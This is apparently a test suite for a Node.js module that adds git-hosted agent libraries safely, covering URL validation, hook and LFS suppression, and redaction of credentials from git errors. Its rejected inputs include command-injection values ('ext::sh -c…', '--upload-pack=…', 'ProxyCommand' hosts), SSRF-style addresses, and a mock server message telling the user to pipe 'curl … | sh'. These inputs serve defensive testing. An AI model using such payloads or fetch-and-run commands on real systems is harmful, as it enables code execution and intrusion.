// Tests des bibliothèques d'agents (lib/libraries.mjs, et leurs agents dans lib/agents.mjs). node --test test/
// Tout vit dans un dossier temporaire. Les dépôts « publiés » sont de vrais dépôts git locaux (serveur/<chemin>), créés
// ici ; Vigie les voit derrière des adresses GitHub par un faux git (faux-git.mjs) qui note ses appels puis lance le vrai
// git en changeant https://github.com/ et git@github.com: en file://<serveur>/ : https et ssh y sont coupés, aucun
// serveur réel n'est jamais contacté. Les hôtes https sont résolus par un résolveur fixe (aucune requête DNS). Le faux
// git pose aussi des hooks dans chaque clone (init.templateDir) : ils ne doivent jamais tourner. Sans git sur le Mac,
// les essais qui clonent sont sautés.
import { test, after, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync } from 'node:child_process';

const TMP = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'vigie-bibliotheques-')));
process.env.VIGIE_DATA = path.join(TMP, 'données');
process.umask(0o077); // comme le moteur
after(() => fs.rmSync(TMP, { recursive: true, force: true }));
const L = await import('../lib/libraries.mjs');
const { createAgents, AGENT_CHANGED } = await import('../lib/agents.mjs');
const { MSG } = L;

const REAL_GIT = L.gitInstalled('/usr/bin/git') ? '/usr/bin/git' : null;
const NO_GIT = REAL_GIT ? false : 'git n\'est pas installé sur ce Mac';
const J = JSON.stringify;
const mode = (p) => fs.statSync(p).mode & 0o777;
const w = (p, s) => { fs.mkdirSync(path.dirname(p), { recursive: true }); fs.writeFileSync(p, s); };
const until = async (fn, ms = 5000) => {
  const t0 = Date.now();
  while (!fn()) { if (Date.now() - t0 > ms) throw new Error('trop long'); await new Promise((r) => setTimeout(r, 10)); }
};

// ---------- dépôts publiés (vrais dépôts git locaux) ----------
const SERVER = path.join(TMP, 'serveur');
const CLEAN_ENV = Object.fromEntries(Object.entries(process.env).filter(([k]) => !k.startsWith('GIT_')));
const FIX_ENV = { ...CLEAN_ENV, GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1', GIT_AUTHOR_NAME: 'Studio', GIT_AUTHOR_EMAIL: 'studio@example.com',
  GIT_COMMITTER_NAME: 'Studio', GIT_COMMITTER_EMAIL: 'studio@example.com' };
function g(cwd, ...args) {
  const r = spawnSync(REAL_GIT, args, { cwd, env: FIX_ENV, encoding: 'utf8' });
  assert.equal(r.status, 0, `git ${args.join(' ')} : ${r.stderr}`);
  return r.stdout;
}
// Dépôts publiés par un essai : repartent de zéro au premier publish de l'essai (même adresse d'un essai à l'autre).
const published = new Set();
let testName = null;
beforeEach((t) => { testName = t.name; });
// Publie une version du dépôt serveur/<chemin> : { 'chemin/fichier': 'contenu' | { link: 'cible' } | null (retiré) }.
// Rend le commit.
function publish(repo, files, message = 'version') {
  if (!published.has(`${testName}\u0000${repo}`)) {
    published.add(`${testName}\u0000${repo}`);
    fs.rmSync(path.join(SERVER, repo), { recursive: true, force: true });
  }
  const d = path.join(SERVER, repo);
  if (!fs.existsSync(path.join(d, '.git'))) { fs.mkdirSync(d, { recursive: true }); g(d, 'init', '-q', '-b', 'main'); }
  for (const [rel, v] of Object.entries(files)) {
    const p = path.join(d, rel);
    fs.rmSync(p, { recursive: true, force: true });
    if (v === null) continue;
    fs.mkdirSync(path.dirname(p), { recursive: true });
    if (typeof v === 'object') fs.symlinkSync(v.link, p); else fs.writeFileSync(p, v);
  }
  g(d, 'add', '-A');
  g(d, 'commit', '-q', '--allow-empty', '-m', message);
  return g(d, 'rev-parse', 'HEAD').trim();
}
const agentMd = (name, body = 'Consigne.') => `---\nname: ${name}\n---\n${body}\n`;

// ---------- faux git ----------
const FAKE = path.join(TMP, 'faux-git.mjs');
const LOG = path.join(TMP, 'faux-git.log');
const SLOW = path.join(TMP, 'lent');            // présent : ls-remote, clone et fetch attendent N ms
const SLOW_LOCAL = path.join(TMP, 'lent-local'); // présent : les commandes sur le Mac (rev-parse, ls-tree…) attendent N ms
const LEAK = path.join(TMP, 'bavard');          // présent : les commandes réseau échouent avec un jeton dans leur message
const OFFLINE = path.join(TMP, 'hors-ligne');   // présent : les commandes réseau échouent faute de réseau
const HOSTKEY = path.join(TMP, 'hote-inconnu'); // présent : les commandes réseau échouent, hôte SSH inconnu
const LFS = path.join(TMP, 'lfs');              // présent : un filtre git-lfs est réglé sur le Mac (et exigé)
const TEMPLATE = path.join(TMP, 'modele');      // hooks posés dans chaque clone par le faux git
const MARK = path.join(TMP, 'hook-lance');      // un hook a tourné
const LFS_FILTER = path.join(TMP, 'filtre-lfs.sh');
const LFS_MARK = path.join(TMP, 'filtre-lfs-lance');
for (const h of ['post-checkout', 'post-merge', 'reference-transaction', 'post-index-change', 'pre-auto-gc']) {
  w(path.join(TEMPLATE, 'hooks', h), `#!/bin/sh\necho "$0" >> ${J(MARK)}\n`);
  fs.chmodSync(path.join(TEMPLATE, 'hooks', h), 0o755);
}
w(LFS_FILTER, `#!/bin/sh\necho lfs >> ${J(LFS_MARK)}\ncat >/dev/null\necho "contenu LFS"\n`);
fs.chmodSync(LFS_FILTER, 0o755);
w(FAKE, `#!${process.execPath}
import fs from 'node:fs';
import { spawnSync } from 'node:child_process';
const args = process.argv.slice(2);
const SUBS = ['clone', 'fetch', 'reset', 'ls-files', 'rev-parse', 'ls-remote', 'ls-tree', 'read-tree', 'checkout-index'];
const sub = args.find((a) => SUBS.includes(a)) || null;
const env = process.env;
const gitEnv = Object.fromEntries(Object.entries(env).filter(([k]) => k.startsWith('GIT_') || k === 'SSH_ASKPASS' || k === 'GCM_INTERACTIVE'));
fs.appendFileSync(${J(LOG)}, JSON.stringify({ pid: process.pid, sub, args, cwd: process.cwd(), env: gitEnv, start: Date.now() }) + '\\n');
const net = sub === 'clone' || sub === 'fetch' || sub === 'ls-remote';
const sleep = (f) => Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, Number(fs.readFileSync(f, 'utf8')));
if (net && fs.existsSync(${J(SLOW)})) sleep(${J(SLOW)});
if (!net && fs.existsSync(${J(SLOW_LOCAL)})) sleep(${J(SLOW_LOCAL)});
if (net && fs.existsSync(${J(LEAK)})) {
  process.stderr.write("remote: Invalid username or password for https://alex:ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8@github.com\\nfatal: Authentication failed for 'https://alex:hunter2@github.com/studio/agents/'\\n");
  process.exit(128);
}
if (net && fs.existsSync(${J(OFFLINE)})) {
  process.stderr.write("fatal: unable to access 'https://github.com/studio/agents/': Could not resolve host: github.com\\n");
  process.exit(128);
}
if (net && fs.existsSync(${J(HOSTKEY)})) {
  process.stderr.write("Host key verification failed.\\r\\nfatal: Could not read from remote repository.\\n\\nPlease make sure you have the correct access rights\\nand the repository exists.\\n");
  process.exit(128);
}
const lfs = fs.existsSync(${J(LFS)}) ? ['-c', ${J(`filter.lfs.smudge=${LFS_FILTER}`)}, '-c', 'filter.lfs.required=true'] : [];
const swap = { 'protocol.file.allow=never': 'protocol.file.allow=always', 'protocol.https.allow=always': 'protocol.https.allow=never', 'protocol.ssh.allow=always': 'protocol.ssh.allow=never' };
const r = spawnSync(${J(REAL_GIT || '/nonexistent')}, [
  '-c', ${J(`url.file://${SERVER}/.insteadOf=https://github.com/`)}, '-c', ${J(`url.file://${SERVER}/.insteadOf=git@github.com:`)},
  '-c', ${J(`init.templateDir=${TEMPLATE}`)}, ...lfs, ...args.map((a) => swap[a] ?? a),
], { stdio: 'inherit', env: { ...env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1' } });
fs.appendFileSync(${J(LOG)}, JSON.stringify({ pid: process.pid, sub, end: Date.now(), code: r.status }) + '\\n');
process.exit(r.status ?? 1);
`);
fs.chmodSync(FAKE, 0o755);
const lines = () => { try { return fs.readFileSync(LOG, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l)); } catch { return []; } };
const calls = () => lines().filter((l) => l.args);
const resetLog = () => fs.rmSync(LOG, { force: true });
const PIN = ['-c', 'http.curloptResolve=github.com:443:140.82.112.3'];
const after0 = (c) => c.args.slice(L.SAFE_CONFIG.length);

// ---------- un monde neuf par essai ----------
// github.com est résolu en une adresse publique fixe ; tout autre hôte est introuvable.
const RESOLVE = L.staticResolve({ 'github.com': ['140.82.112.3'] });
let n = 0;
let clock = Date.parse('2026-10-26T10:00:00Z');
function world(opts = {}) {
  const root = path.join(TMP, `monde-${++n}`);
  const data = path.join(root, 'données');
  const home = path.join(root, 'maison');
  fs.mkdirSync(path.join(home, 'Code'), { recursive: true });
  const lowered = [];
  let agents = null;
  const libs = L.createLibraries({ dataDir: data, gitBin: FAKE, now: () => new Date(clock), lower: (pid) => lowered.push(pid), resolve: RESOLVE,
    takenIds: () => agents.localIds(), ...opts });
  const agentsDir = path.join(data, 'agents');
  agents = createAgents({ dir: agentsDir, home, libraries: () => libs.copies(), now: () => new Date('2026-10-26T14:03:00') });
  const local = (id, text) => w(path.join(agentsDir, id, 'AGENT.md'), text);
  // copy : la version en service ; lib : le dossier de la bibliothèque (toutes ses versions)
  const copy = (id) => { const e = libs.entries().find((x) => x.id === id); return e ? libs.versionDir(e) : null; };
  return { root, data, home, libs, agents, agentsDir, local, lowered, copy, lib: (id) => path.join(data, 'agent-libraries', id), root2: path.join(data, 'agent-libraries') };
}
// Une autre instance sur la même liste (délai, limites…), toujours avec le résolveur fixe.
const mk = (W, opts = {}) => L.createLibraries({ dataDir: W.data, gitBin: FAKE, now: () => new Date(clock), resolve: RESOLVE, ...opts });
// Tout ce que le dossier contient : [chemin relatif, 'f' | 'd' | 'l'].
function walk(dir, rel = '') {
  const out = [];
  for (const e of fs.readdirSync(path.join(dir, rel), { withFileTypes: true })) {
    const r = rel ? `${rel}/${e.name}` : e.name;
    if (r === '.git') continue;
    out.push([r, e.isSymbolicLink() ? 'l' : e.isDirectory() ? 'd' : 'f']);
    if (e.isDirectory()) out.push(...walk(dir, r));
  }
  return out.sort((a, b) => (a[0] < b[0] ? -1 : 1));
}

// ---------- adresses ----------

test('adresses : https, git@ et ssh://git@ acceptées ; le reste refusé, avec la phrase du contrat', () => {
  assert.equal(MSG.badUrl, 'Adresse refusée : colle l\'adresse du dépôt (https://github.com/… ou git@github.com:…).');
  // nom montré : « propriétaire/dépôt » ; repo : le nom du dépôt, d'où vient l'id
  const ok = {
    'https://github.com/studio/agents': ['studio/agents', 'agents', 'github.com/studio/agents'],
    'https://github.com/studio/agents.git': ['studio/agents', 'agents', 'github.com/studio/agents'],
    '  https://github.com/studio/agents/\n': ['studio/agents', 'agents', 'github.com/studio/agents'],
    'git@github.com:studio/agents.git': ['studio/agents', 'agents', 'github.com/studio/agents'],
    'git@github.com:studio/agents': ['studio/agents', 'agents', 'github.com/studio/agents'],
    'ssh://git@github.com/studio/agents.git': ['studio/agents', 'agents', 'github.com/studio/agents'],
    'ssh://git@git.studio.fr:2222/equipe/agents-studio.git': ['equipe/agents-studio', 'agents-studio', 'git.studio.fr/equipe/agents-studio'],
    'https://gitlab.com/studio/outils/Agents_Studio.git': ['outils/Agents_Studio', 'Agents_Studio', 'gitlab.com/studio/outils/agents_studio'],
    'https://dev.azure.com/studio/Projet%20Web/_git/agents': ['Projet Web/agents', 'agents', 'dev.azure.com/studio/projet%20web/_git/agents'],
    'https://140.82.112.3/studio/agents': ['studio/agents', 'agents', '140.82.112.3/studio/agents'],
    'https://github.com/agents': ['agents', 'agents', 'github.com/agents'],
  };
  for (const [url, [name, repo, key]] of Object.entries(ok)) {
    const c = L.checkUrl(url);
    assert.deepEqual([c.error, c.name, c.repo, c.key, c.url], [undefined, name, repo, key, url.trim()], url);
  }
  assert.deepEqual([L.checkUrl('https://github.com/studio/agents').host, L.checkUrl('https://github.com/studio/agents').port, L.checkUrl('https://git.studio.fr:8443/a/b').port], ['github.com', 443, 8443]);
  assert.deepEqual([L.checkUrl('git@GitHub.com:studio/agents').ssh, L.checkUrl('ssh://git@git.studio.fr:2222/a/b').ssh, L.checkUrl('ssh://git@git.studio.fr/a/b').ssh],
    ['git@github.com', '-p 2222 git@git.studio.fr', 'git@git.studio.fr'], 'ce qu\'il faut taper pour se connecter une fois');
  const refused = [
    '', '   ', null, 42, {}, ['https://github.com/studio/agents'],
    // pas une adresse de dépôt distant
    'file:///Users/alex/agents', 'FILE:///Users/alex/agents', '/Users/alex/agents', './agents', '../agents', '~/Code/agents', 'agents',
    'ext::sh -c touch% /tmp/x', 'ext::ssh', 'git://github.com/studio/agents', 'http://github.com/studio/agents', 'HTTPS://github.com/studio/agents',
    'ftp://github.com/x', 'rsync://github.com/x', 'fd::17', 'transport::x',
    // options, espaces, caractères de contrôle ou hors ASCII (même encodés), trop long
    '-uhttps://github.com/x', '--upload-pack=touch /tmp/x', '--config=core.sshCommand=x',
    'https://github.com/studio/ agents', 'https://github.com/studio/a\nb', 'https://github.com/studio/a\u0000b', 'https://github.com/studio/a\tb',
    'https://github.com/studio/a b', 'https://gíthub.com/studio/agents', 'https://github.com/studio/agents‮', 'https://github.com/studio/agents​',
    'https://github.com/studio/agents%0a', 'https://github.com/studio/agents%0D', 'https://github.com/studio/agents%00', 'https://github.com/studio/a%1fb',
    'https://github.com/studio/agents%7F', 'git@github.com:studio/agents%0a.git', 'ssh://git@github.com/studio/agents%0d',
    `https://github.com/studio/${'a'.repeat(2048)}`,
    // hôte local, privé, ou qui se lirait comme une adresse IP
    'https://localhost/studio/agents', 'https://LOCALHOST/x', 'https://git.localhost/x', 'https://127.0.0.1/x', 'https://127.1/x', 'https://10.0.0.2/x',
    'https://192.168.1.10/x', 'https://172.20.0.1/x', 'https://169.254.169.254/latest', 'https://0.0.0.0/x', 'https://100.64.0.1/x',
    'https://224.0.0.1/x', 'https://[::1]/x', 'https://[fe80::1]/x', 'https://2130706433/x', 'https://0x7f.1/x', 'https://0x7f000001/x',
    'https://017.0.0.1/x', 'https://1.2.3/x', 'https://intranet/x', 'https://nas.local/x', 'https://git.studio.internal/x', 'https://git.test/x',
    'https://-github.com/x', 'https://github-.com/x', 'https://github..com/x', 'https://github.com./x', 'https://github.com:0/x', 'https://github.com:99999/x',
    'https://github.com\\@127.0.0.1/x', 'https://github.com\\.evil.example@127.0.0.1/x',
    // chemin vide, remontée, requête, ancre
    'https://github.com', 'https://github.com/', 'https://github.com//', 'https://github.com/studio/../x', 'https://github.com/studio/./x',
    'https://github.com/studio//agents', 'https://github.com/studio/agents?x=1', 'https://github.com/studio/agents#main', 'https://github.com/-studio/agents',
    // ssh : utilisateur git seulement, hôte public, chemin relatif sans option
    'git@localhost:x.git', 'git@127.0.0.1:x.git', 'git@-oProxyCommand=x:y', 'git@github.com:-x/y', 'git@github.com:/abs/path', 'git@github.com:',
    'git@github.com:a:b', 'alex@github.com:studio/agents.git', '@github.com:x', 'ssh://alex@github.com/x', 'ssh://github.com/x', 'ssh://git@192.168.0.2/x',
    'ssh://git@github.com', 'ssh://git@-oProxyCommand=x/y', 'ssh://git@github.com/../x',
  ];
  for (const url of refused) assert.deepEqual(L.checkUrl(url), { error: MSG.badUrl }, J(url));
  // identifiant dans l'adresse : refusé, git utilise ceux du Mac
  assert.equal(MSG.credentials, 'N\'écris pas d\'identifiant dans l\'adresse : git utilise ceux de ton Mac.');
  for (const url of ['https://alex:ghp_A1b2C3d4E5f6@github.com/studio/agents', 'https://ghp_A1b2C3d4E5f6@github.com/studio/agents',
    'https://alex@github.com/studio/agents', 'https://alex:@github.com/x', 'https://github.com%2f@127.0.0.1/x', 'ssh://git:secret@github.com/studio/agents.git',
    'http://alex:secret@github.com/x']) {
    assert.deepEqual(L.checkUrl(url), { error: MSG.credentials }, url);
  }
  // l'adresse d'une page du dépôt (copiée depuis le navigateur) : celle du dépôt à coller
  const pages = {
    'https://github.com/studio/agents/tree/main': 'https://github.com/studio/agents',
    'https://github.com/studio/agents/tree/main/demarrer-projet': 'https://github.com/studio/agents',
    'https://github.com/studio/agents/blob/main/README.md': 'https://github.com/studio/agents',
    'https://www.github.com/studio/agents.git/pulls': 'https://www.github.com/studio/agents',
    'https://gitlab.com/studio/outils/agents/-/tree/main': 'https://gitlab.com/studio/outils/agents',
    'https://git.studio.fr:8443/equipe/agents/-/blob/main/x.md': 'https://git.studio.fr:8443/equipe/agents',
    'https://bitbucket.org/studio/agents/src/main/': 'https://bitbucket.org/studio/agents',
    'https://codeberg.org/studio/agents/commits/branch/main': 'https://codeberg.org/studio/agents',
  };
  for (const [url, repo] of Object.entries(pages)) assert.deepEqual(L.checkUrl(url), { error: MSG.page(repo) }, url);
  assert.equal(MSG.page('https://github.com/studio/agents'), 'Colle l\'adresse du dépôt lui-même (https://github.com/studio/agents), pas celle d\'une page.');
});

test('adresses privées : une IPv4 dans une IPv6 jugée comme une IPv4, réseau local et réservées refusés', () => {
  for (const ip of ['127.0.0.1', '10.1.2.3', '192.168.1.1', '172.16.0.1', '169.254.169.254', '100.64.0.1', '0.0.0.0', '::', '::1', 'fd00::1', 'fc12:3456::1',
    'fe80::1', 'fe80::1%en0', 'ff02::1', '2001:db8::1', '::ffff:127.0.0.1', '::ffff:192.168.1.1', '::ffff:7f00:1', '64:ff9b::a00:1', '::10.0.0.1', 'pas une ip', '1:2:3']) {
    assert.equal(L.privateAddress(ip), true, ip);
  }
  for (const ip of ['140.82.112.3', '8.8.8.8', '2606:50c0:8000::153', '2a01:e0a:1:2::3', '::ffff:140.82.112.3', '64:ff9b::8c52:7003']) {
    assert.equal(L.privateAddress(ip), false, ip);
  }
});

test('git est-il là ? Le relais /usr/bin/git seulement si les outils de développement sont installés, vu sans rien lancer', () => {
  const D = path.join(TMP, 'outils');
  const xcode = path.join(D, 'Xcode.app', 'Contents', 'Developer');
  const clt = path.join(D, 'CommandLineTools');
  const link = path.join(D, 'xcode_select_link');
  const opts = (more = {}) => ({ env: {}, devDirs: [xcode, clt], selectLinks: [link], ...more });
  const tool = (dir, exe = true) => { w(path.join(dir, 'usr', 'bin', 'git'), '#!/bin/sh\n'); fs.chmodSync(path.join(dir, 'usr', 'bin', 'git'), exe ? 0o755 : 0o644); };
  assert.equal(L.gitInstalled('/usr/bin/git', opts()), false, 'ni Xcode ni outils en ligne de commande : jamais lancé');
  tool(clt, false);
  assert.equal(L.gitInstalled('/usr/bin/git', opts()), false, 'git pas exécutable');
  tool(clt);
  assert.equal(L.gitInstalled('/usr/bin/git', opts()), true, 'outils en ligne de commande');
  fs.mkdirSync(xcode, { recursive: true });
  assert.equal(L.gitInstalled('/usr/bin/git', opts()), false, 'Xcode est cherché d\'abord : sans git, le relais s\'arrêterait là');
  tool(xcode);
  assert.equal(L.gitInstalled('/usr/bin/git', opts()), true);
  // choix de xcode-select, puis DEVELOPER_DIR : seuls comptés quand ils existent
  const other = path.join(D, 'autre');
  fs.mkdirSync(other);
  fs.symlinkSync(other, link);
  assert.equal(L.gitInstalled('/usr/bin/git', opts()), false, 'outils choisis par xcode-select, sans git');
  tool(other);
  assert.equal(L.gitInstalled('/usr/bin/git', opts()), true);
  assert.equal(L.gitInstalled('/usr/bin/git', opts({ env: { DEVELOPER_DIR: path.join(D, 'vide') } })), false, 'DEVELOPER_DIR passe avant');
  assert.equal(L.gitInstalled('/usr/bin/git', opts({ env: { DEVELOPER_DIR: clt } })), true);
  // un autre git (VIGIE_GIT_BIN) : présent et exécutable
  assert.equal(L.gitInstalled(FAKE, opts()), true);
  assert.equal(L.gitInstalled(path.join(D, 'absent', 'git'), opts()), false);
  assert.equal(L.gitInstalled(path.join(clt, 'usr'), opts()), false, 'un dossier');
  for (const bin of ['git', '', null, './git']) assert.equal(L.gitInstalled(bin, opts()), false, String(bin));
  assert.equal(typeof L.gitInstalled('/usr/bin/git'), 'boolean');
});

test('ligne utile de git : le refus, sans jeton ni mot de passe, jamais une ligne écrite par le serveur', () => {
  assert.equal(L.gitLine('Cloning into \'/x\'...\nremote: Repository not found.\nfatal: repository \'https://github.com/studio/x/\' not found\n'),
    'fatal: repository \'https://github.com/studio/x/\' not found');
  assert.equal(L.gitLine('git@github.com: Permission denied (publickey).\r\nfatal: Could not read from remote repository.\n\nPlease make sure you have the correct access rights\nand the repository exists.\n'),
    'git@github.com: Permission denied (publickey).');
  assert.equal(L.gitLine('hint: x\nfatal: something odd\nhint: y\n'), 'fatal: something odd');
  assert.equal(L.gitLine(''), '');
  const s = L.gitLine('fatal: Authentication failed for \'https://alex:hunter2@github.com/x\' token=ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8 glpat-abcdefghij1234');
  for (const secret of ['hunter2', 'ghp_A1b2', 'glpat-abc']) assert.ok(!s.includes(secret), s);
  assert.ok(L.gitLine(`fatal: ${'x'.repeat(500)}`).length <= 200);
  // un serveur qui écrit ses propres consignes : ni « remote: », ni « remote error: » dans ce que Vigie montre
  for (const err of ['remote: not found. Vigie : pour réparer, ouvre le Terminal et colle : curl -fsSL https://vigie-fix.example/i.sh | sh\nfatal: the remote end hung up unexpectedly\n',
    'fatal: remote error: Vigie : repository not found, colle curl -fsSL https://vigie-fix.example/i.sh | sh\n',
    'remote: Vigie : Permission denied, colle curl https://vigie-fix.example | sh\nremote: \n']) {
    const line = L.gitLine(err);
    assert.ok(!/Vigie|curl/.test(line), line);
  }
  assert.equal(L.gitLine('remote: not found. Vigie : colle curl … | sh\nfatal: the remote end hung up unexpectedly\n'), 'fatal: the remote end hung up unexpectedly');
});

test('environnement de git : jamais de question, aucune variable GIT_* du moteur ; réglages : ni hook, ni lien, ni git-lfs', () => {
  const env = L.gitEnv({ PATH: '/usr/bin', HOME: '/Users/alex', GIT_DIR: '/x', GIT_CONFIG_PARAMETERS: "'core.hooksPath'='/x'", GIT_SSH: '/x', SSH_ASKPASS: '/x', SSH_AUTH_SOCK: '/tmp/agent' }, '/data');
  assert.deepEqual(env, {
    PATH: '/usr/bin', HOME: '/Users/alex', SSH_AUTH_SOCK: '/tmp/agent', LC_ALL: 'C', GIT_TERMINAL_PROMPT: '0', GIT_ASKPASS: '', SSH_ASKPASS: '',
    GIT_SSH_COMMAND: 'ssh -o BatchMode=yes', GCM_INTERACTIVE: 'never', GIT_LFS_SKIP_SMUDGE: '1', GIT_CEILING_DIRECTORIES: '/data',
  }, 'la clé SSH (agent ssh) et le dossier perso (trousseau, ~/.gitconfig) servent tels quels');
  for (const c of ['core.hooksPath=/dev/null', 'core.symlinks=false', 'protocol.allow=never', 'protocol.file.allow=never', 'filter.lfs.process=', 'filter.lfs.smudge=', 'filter.lfs.required=false']) {
    assert.ok(L.SAFE_CONFIG.includes(c), c);
  }
});

// ---------- ajout ----------

test('ajout : version figée, copie privée, git lancé sans question ni rien exécuter du dépôt ; la liste ne relance pas git', { skip: NO_GIT }, () => {
  const files = {
    'README.md': '# Agents du studio\n',
    'demarrer-projet/AGENT.md': agentMd('Démarrer un projet', 'Scripts : {{dossier_agent}}/figma'),
    'demarrer-projet/figma/01-fondations.js': 'figma.root;\n',
    'creer-une-page/AGENT.md': agentMd('Créer une page'),
  };
  const sha = publish('studio/agents', files);
  const bytes = Object.values(files).reduce((s, v) => s + Buffer.byteLength(v), 0);
  // les hooks du faux git tournent bien sans la protection de Vigie (sinon l'essai ne prouverait rien)
  const probe = path.join(TMP, 'sonde');
  g(TMP, '-c', `init.templateDir=${TEMPLATE}`, 'clone', '-q', '--', path.join(SERVER, 'studio', 'agents'), probe);
  assert.ok(fs.existsSync(MARK), 'hook lancé sans core.hooksPath');
  fs.rmSync(MARK);
  fs.rmSync(probe, { recursive: true });

  resetLog();
  const W = world({ env: { ...process.env, GIT_DIR: path.join(TMP, 'piège'), GIT_CONFIG_PARAMETERS: '\'core.hooksPath\'=\'/tmp\'', GIT_SSH: '/usr/bin/false' } });
  return W.libs.add(' https://github.com/studio/agents ').then((r) => {
    assert.equal(r.ok, true, r.error);
    assert.equal(r.message, 'Bibliothèque ajoutée : 2 agents.');
    const at = new Date(clock).toISOString();
    assert.deepEqual(r.library, { id: 'agents', name: 'studio/agents', url: 'https://github.com/studio/agents', addedAt: at, updatedAt: at, commit: sha.slice(0, 7),
      status: 'ok', error: null, agents: 2 });
    // liste et copie, lisibles par l'utilisateur seul ; les ids des agents retenus
    const file = path.join(W.data, 'agent-libraries.json');
    assert.equal(mode(file), 0o600);
    assert.deepEqual(JSON.parse(fs.readFileSync(file, 'utf8')), [{ id: 'agents', url: 'https://github.com/studio/agents', addedAt: at, updatedAt: at, checkedAt: at, commit: sha,
      bytes, error: null, agents: { 'creer-une-page': 'creer-une-page', 'demarrer-projet': 'demarrer-projet' }, retired: [] }]);
    // la version figée : <id>/<commit7>/, sans dépôt git
    assert.equal(W.copy('agents'), path.join(W.lib('agents'), sha.slice(0, 7)));
    for (const d of [W.root2, W.lib('agents'), W.copy('agents')]) assert.equal(mode(d), 0o700, d);
    assert.equal(fs.readFileSync(path.join(W.copy('agents'), 'README.md'), 'utf8'), '# Agents du studio\n');
    assert.deepEqual(fs.readdirSync(W.root2), ['agents'], 'copie temporaire retirée, rien d\'autre');
    assert.deepEqual(fs.readdirSync(W.lib('agents')), [sha.slice(0, 7)]);
    assert.equal(fs.existsSync(path.join(W.copy('agents'), '.git')), false, 'aucun dépôt git dans la version');
    // git : la version publiée, le dépôt sans rien extraire, compté, puis extrait ; réglages de sécurité, sans shell, sans question
    const c = calls();
    assert.deepEqual(c.map((x) => x.sub), ['ls-remote', 'clone', 'rev-parse', 'ls-tree', 'read-tree', 'checkout-index']);
    for (const x of c) {
      assert.deepEqual(x.args.slice(0, L.SAFE_CONFIG.length), L.SAFE_CONFIG, 'réglages de sécurité en tête de chaque commande');
      for (const cfg of ['core.hooksPath=/dev/null', 'core.symlinks=false', 'protocol.file.allow=never', 'protocol.allow=never', 'submodule.recurse=false', 'filter.lfs.smudge=']) {
        assert.ok(x.args.includes(cfg), `${x.sub} : ${cfg}`);
      }
      assert.deepEqual(Object.keys(x.env).sort(), ['GCM_INTERACTIVE', 'GIT_ASKPASS', 'GIT_CEILING_DIRECTORIES', 'GIT_LFS_SKIP_SMUDGE', 'GIT_SSH_COMMAND', 'GIT_TERMINAL_PROMPT', 'SSH_ASKPASS'],
        'GIT_DIR, GIT_CONFIG_PARAMETERS, GIT_SSH du moteur retirés');
      assert.deepEqual([x.env.GIT_TERMINAL_PROMPT, x.env.GIT_ASKPASS, x.env.SSH_ASKPASS, x.env.GIT_SSH_COMMAND, x.env.GIT_CEILING_DIRECTORIES],
        ['0', '', '', 'ssh -o BatchMode=yes', W.data]);
    }
    assert.deepEqual(after0(c[0]), [...PIN, 'ls-remote', '--', 'https://github.com/studio/agents', 'HEAD'], 'hôte résolu, adresse figée pour git');
    const clone = after0(c[1]);
    const tmp = clone[clone.length - 1];
    assert.deepEqual(clone, [...PIN, 'clone', '--no-checkout', '--depth', '1', '--no-tags', '--single-branch', '--no-recurse-submodules', '--', 'https://github.com/studio/agents', tmp]);
    assert.equal(path.dirname(tmp), W.root2);
    assert.match(path.basename(tmp), /^\.agents\.[0-9a-f]{12}\.tmp$/);
    assert.equal(c[1].cwd, W.root2);
    assert.deepEqual(after0(c[2]), [`--git-dir=${tmp}/.git`, 'rev-parse', '--verify', 'HEAD^{commit}']);
    assert.deepEqual(after0(c[3]), [`--git-dir=${tmp}/.git`, 'ls-tree', '-r', '-l', '-z', '--full-tree', sha], 'compté avant d\'extraire');
    const work = after0(c[4])[1].slice('--work-tree='.length);
    assert.equal(path.dirname(work), W.lib('agents'));
    assert.match(path.basename(work), new RegExp(`^\\.${sha.slice(0, 7)}\\.[0-9a-f]{12}\\.tmp$`));
    assert.deepEqual(after0(c[4]), [`--git-dir=${tmp}/.git`, `--work-tree=${work}`, 'read-tree', sha]);
    assert.deepEqual(after0(c[5]), [`--git-dir=${tmp}/.git`, `--work-tree=${work}`, 'checkout-index', '-f', '-z', '--stdin']);
    assert.equal(c[5].cwd, work);
    assert.equal(fs.existsSync(MARK), false, 'aucun hook du dépôt ni du modèle n\'a tourné');
    assert.deepEqual(W.lowered, [], 'demandé par l\'utilisateur : priorité normale');
    // la liste des agents, la vue des bibliothèques : des fichiers lus, jamais git
    const before = calls().length;
    for (let i = 0; i < 3; i++) { W.agents.list(); W.libs.view(); W.agents.get('demarrer-projet'); W.agents.get('inconnu'); }
    assert.equal(calls().length, before, 'aucun git pour lire la liste');
    assert.deepEqual(W.agents.list().map((a) => [a.id, a.source]), [
      ['creer-une-page', { kind: 'library', id: 'agents', name: 'studio/agents' }],
      ['demarrer-projet', { kind: 'library', id: 'agents', name: 'studio/agents' }],
    ]);
  });
});

test('ajout : doublon sous une autre forme, id unique, échecs (introuvable, réseau, délai, jeton), adresse refusée, trop de bibliothèques', { skip: NO_GIT }, async () => {
  publish('studio/agents', { 'a/AGENT.md': agentMd('A') });
  publish('equipe/agents', { 'b/AGENT.md': agentMd('B') });
  const W = world();
  // même liste, délai de 800 ms (90 s pour de vrai)
  const quick = mk(W, { timeoutMs: 800 });
  // copie temporaire laissée par un moteur arrêté en plein clonage : retirée au clonage suivant
  w(path.join(W.root2, '.vieux.0123456789ab.tmp', '.git', 'HEAD'), 'ref: refs/heads/main\n');
  assert.equal((await W.libs.add('https://github.com/studio/agents')).ok, true);
  assert.deepEqual(fs.readdirSync(W.root2), ['agents']);
  for (const url of ['https://github.com/studio/agents', 'https://github.com/studio/agents.git', 'https://GitHub.com/Studio/Agents/', 'git@github.com:studio/agents.git',
    'ssh://git@github.com/studio/agents']) {
    assert.deepEqual(await W.libs.add(url), { ok: false, status: 400, error: 'Cette bibliothèque est déjà là.' }, url);
  }
  const r = await W.libs.add('https://github.com/equipe/agents');
